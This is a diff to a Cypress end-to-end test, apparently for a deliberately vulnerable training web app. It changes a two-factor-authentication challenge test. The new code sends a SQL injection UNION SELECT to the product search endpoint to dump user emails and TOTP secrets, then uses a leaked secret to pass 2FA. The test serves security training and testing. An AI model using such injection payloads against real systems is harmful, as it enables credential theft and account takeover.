@@ -123,12 +123,15 @@ describe('/#/login', () => {
         }
       )
 
-      cy.task<string>('GenerateAuthenticator', 'IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH').then(
-        (totpToken: string) => {
-          void cy.get('#totpToken').type(totpToken)
-          void cy.get('#totpSubmitButton').click()
-        }
-      )
+      cy.request("/rest/products/search?q=')) union select id,email,totpSecret,'4','5','6','7','8','9' from users--").then((response) => {
+        const wurstbrot = response.body.data.find((row: { name: string }) => row.name.startsWith('wurstbrot@'))
+        cy.task<string>('GenerateAuthenticator', wurstbrot.description).then(
+          (totpToken: string) => {
+            void cy.get('#totpToken').type(totpToken)
+            void cy.get('#totpSubmitButton').click()
+          }
+        )
+      })
       cy.expectChallengeSolved({ challenge: 'Two Factor Authentication' })
     })
   })
